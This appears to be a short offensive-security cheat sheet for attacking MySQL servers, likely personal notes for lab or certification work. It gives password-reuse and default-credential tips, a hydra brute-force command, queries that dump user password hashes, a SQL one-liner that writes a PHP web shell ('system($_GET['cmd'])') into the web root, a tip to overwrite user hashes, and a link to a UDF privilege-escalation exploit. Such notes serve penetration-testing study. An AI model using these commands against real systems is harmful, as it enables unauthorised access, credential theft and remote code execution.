
### Authentication

Try to resuse the same password for higher priv users:
- user:password --> root:password 
- try `root:root`
```bash
mysql -h <IP> -u <user> -p
```

Bruteforce using hydra:
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<IP>
```
>[!info]
>Root is the default username


### Enumeration

| Command                     | Info                  |
| --------------------------- | --------------------- |
| `SELECT version();`         | Get MySQL version     |
| `SELECT system_user();`     | Get current DB user   |
| `SHOW DATABASES;`           | List databases        |
| `USE <DB>;`                 | Use DB                |
| `SHOW TABLES;`              | List tables           |
| `SELECT * FROM mysql.user;` | Get DB users & hashes |


### Attacks

**Write webshell to webserver root:**
```bash
select "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

Tricks:
- Replace hash of a user if it can't be cracked


**Privilege Escalation**

UDF:
- https://www.exploit-db.com/exploits/1518
- Writeups: [[Pebbles]] && [[Banzai]]
